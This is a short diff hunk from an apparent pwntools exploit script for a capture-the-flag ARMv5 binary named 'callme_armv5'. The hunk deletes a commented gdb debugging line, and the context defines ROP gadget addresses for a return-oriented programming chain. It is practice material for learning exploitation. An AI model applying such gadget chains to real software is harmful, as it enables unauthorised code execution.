@@ -5,7 +5,6 @@ context.log_level = "critical"
 
 bin = "./callme_armv5"
 p = process(bin)
-#p = gdb.debug(bin, "b*0x0001066c\nc")
 
 multiMovGadget = 0x000108b0 # mov r2, sb; mov r1, r8; mov r0, r7; blx r3
 multiPopGadget = 0x000108c8 # {r4, r5, r6, r7, r8, sb, sl, pc}
